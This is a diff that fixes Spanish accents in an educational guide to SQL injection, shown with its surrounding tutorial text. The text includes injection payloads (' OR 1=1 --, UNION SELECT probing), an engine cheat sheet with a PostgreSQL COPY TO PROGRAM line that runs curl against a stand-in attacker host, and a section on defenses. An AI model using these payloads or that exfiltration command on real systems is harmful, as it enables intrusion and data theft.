@@ -21,13 +21,13 @@ Antes de entender el ataque, necesitas entender que es una base de datos relacio
 
 Una tabla de usuarios se ve así:
 
-| id | nombre  | email              | contrasena_hash                    | rol    |
+| id | nombre  | email              | contraseña_hash                    | rol    |
 |----|---------|-------------------|------------------------------------|--------|
 | 1  | Juan    | juan@email.com    | 5e884898da28047151d0e56f8dc62927  | admin  |
 | 2  | Maria   | maria@email.com   | 6cb75e6525b4c9f3c63c1e2c8b2a3b4c  | usuario|
 | 3  | Pedro   | pedro@email.com   | 9c1134b3c2f8a9e6d1a5b3c4d7e8f9a0  | usuario|
 
-Para interactuar con esta tabla, usamos SQL (Structured Query Language). Una consulta tipica seria:
+Para interactuar con esta tabla, usamos SQL (Structured Query Language). Una consulta típica seria:
 
 ```sql
 SELECT * FROM usuarios WHERE email = 'juan@email.com' AND contrasena_hash = '5e884...'
@@ -77,7 +77,7 @@ SELECT * FROM productos WHERE nombre = '' OR 1=1 --';
 
 Para el Archivero ciego, esta oración tiene lógica matemática pura:
 
-1. **`''` (Vacio):** El archivero busca un producto sin nombre. No encuentra ninguno. Resultado: Falso.
+1. **`''` (Vacío):** El archivero busca un producto sin nombre. No encuentra ninguno. Resultado: Falso.
 2. **`OR`:** La palabra mágica. Significa "Si lo primero fue falso, revisa la segunda opción".
 3. **`1=1`:** El archivero se pregunta: "El número 1 es igual al número 1?" La respuesta es **Verdadero**.
 4. **`--` (Comentario):** Le dice al archivero: "Ignora cualquier otra orden que venga después de esto, no importa."
@@ -235,7 +235,7 @@ O con UNION:
 ' UNION SELECT 1, 2, 3 --
 ```
 
-Si el número 2 aparece en la página, la columna 2 se puede usar para mostrar datos extraidos.
+Si el número 2 aparece en la página, la columna 2 se puede usar para mostrar datos extraídos.
 
 **Paso 3: Extraer datos de otras tablas.**
 
@@ -315,18 +315,18 @@ Cada motor de base de datos tiene sus propias funciones y sintaxis. Un atacante 
 - Función de versión: `VERSION()`
 - Base de datos actual: `DATABASE()`
 - Usuario actual: `USER()`
-- Concatenacion: `CONCAT(columna1, columna2)`
+- Concatenación: `CONCAT(columna1, columna2)`
 
 **PostgreSQL:**
 - Comentarios: `-- `
 - Función de versión: `VERSION()`
 - Base de datos actual: `CURRENT_DATABASE()`
 - Stacked queries: `SELECT 1; SELECT 2`
-- Envio de peticiones: `COPY (SELECT 'dato') TO PROGRAM 'curl http://atacante.com/'`
+- Envío de peticiones: `COPY (SELECT 'dato') TO PROGRAM 'curl http://atacante.com/'`
 
 **SQL Server:**
 - Comentarios: `-- `, `/* */`
-- Concatenacion: `columna1 + columna2`
+- Concatenación: `columna1 + columna2`
 - Comandos del sistema: `xp_cmdshell('comando')`
 - Stacked queries: `SELECT 1; SELECT 2`
 
@@ -334,7 +334,7 @@ Cada motor de base de datos tiene sus propias funciones y sintaxis. Un atacante 
 - Comentarios: `-- `
 - Tabla especial: `FROM dual` (siempre existe)
 - Funciones: `UTL_HTTP.request()` para peticiones externas
-- Concatenacion: `columna1 || columna2`
+- Concatenación: `columna1 || columna2`
 
 ## Casos Reales de SQLi
 
@@ -350,13 +350,13 @@ Cada motor de base de datos tiene sus propias funciones y sintaxis. Un atacante 
 
 ## La Defensa: Como Prevenir SQLi
 
-La defensa contra SQLi es una de las más fáciles de implementar en la seguridad web, ironicamente. No requiere magia ni herramientas costosas. Requiere disciplina.
+La defensa contra SQLi es una de las más fáciles de implementar en la seguridad web, irónicamente. No requiere magia ni herramientas costosas. Requiere disciplina.
 
 ### La Regla de Oro: Consultas Parametrizadas (Prepared Statements)
 
 NUNCA concatenes texto para construir consultas SQL. Usa consultas parametrizadas.
 
-**Mal (Concatenacion - VULNERABLE):**
+**Mal (Concatenación - VULNERABLE):**
 
 ```php
 $query = "SELECT * FROM usuarios WHERE usuario = '" . $_POST['usuario'] . "'";
@@ -376,13 +376,13 @@ Con prepared statements, el input del usuario se trata como datos, no como códi
 Además de prepared statements, implementa:
 
 1. **Validación de tipo:** Si esperas un número, verifica que sea numérico antes de pasarlo a la consulta.
-2. **Principio de mínimo privilegio:** La cuenta de base de datos que usa la aplicación web solo debe tener los permisos minimos necesarios. Si la aplicación solo necesita SELECT, no le des permisos DROP o DELETE.
+2. **Principio de mínimo privilegio:** La cuenta de base de datos que usa la aplicación web solo debe tener los permisos mínimos necesarios. Si la aplicación solo necesita SELECT, no le des permisos DROP o DELETE.
 3. **Escapado de caracteres (solo como respaldo):** Funciones como `mysqli_real_escape_string()` en PHP. No es tan seguro como prepared statements pero es mejor que nada.
 4. **WAF (Web Application Firewall):** Herramientas como ModSecurity o AWS WAF pueden detectar y bloquear patrones de SQLi antes de que lleguen al servidor. No confíes solo en esto pero es una buena capa adicional.
 
 ### Detección de SQLi en el Código (SAST)
 
-Las herramientas SAST (Static Application Security Testing) como SonarQube, Checkmarx o Snyk pueden detectar concatenacion de strings en consultas SQL automáticamente. Si tu pipeline CI/CD tiene un paso SAST que falla cuando detecta concatenacion SQL, el error nunca llega a producción.
+Las herramientas SAST (Static Application Security Testing) como SonarQube, Checkmarx o Snyk pueden detectar concatenación de strings en consultas SQL automáticamente. Si tu pipeline CI/CD tiene un paso SAST que falla cuando detecta concatenación SQL, el error nunca llega a producción.
 
 **Aprende más en:** FUNDAMENTOS-APPSEC.md.
 
@@ -390,7 +390,7 @@ Las herramientas SAST (Static Application Security Testing) como SonarQube, Chec
 
 Un Web Application Firewall (WAF) o Sistema de Detección de Intrusiones (IDS) puede detectar patrones de SQLi en el tráfico HTTP. Buscan palabras clave como `OR 1=1`, `UNION SELECT`, `--`, `DROP TABLE`, etc.
 
-**Limitacion:** Los atacantes evaden WAFs con técnicas de bypass. Por eso el WAF nunca debe ser tu única defensa.
+**Limitación:** Los atacantes evaden WAFs con técnicas de bypass. Por eso el WAF nunca debe ser tu única defensa.
 
 ## Modos de Falla con SQLi
 
@@ -398,7 +398,7 @@ Un Web Application Firewall (WAF) o Sistema de Detección de Intrusiones (IDS) p
 
 **Usar un ORM y asumir que es inmune.** Los ORMs (Object-Relational Mapping) como Hibernate, Entity Framework, o Eloquent usan consultas parametrizadas internamente... a menos que uses "raw queries" o "native queries" que concatenan strings.
 
-**Filtrar palabras clave con blacklists.** Los atacantes evaden filtros con técnicas de encoding, comentarios internos, y variantes sintacticas. La única defensa real es prepared statements.
+**Filtrar palabras clave con blacklists.** Los atacantes evaden filtros con técnicas de encoding, comentarios internos, y variantes sintácticas. La única defensa real es prepared statements.
 
 **Creer que "escapar" es suficiente.** Funciones como `mysql_escape_string()` tienen bugs conocidos y no cubren todos los casos. Además, se te puede olvidar escapar un campo, o escapar dos veces.
 
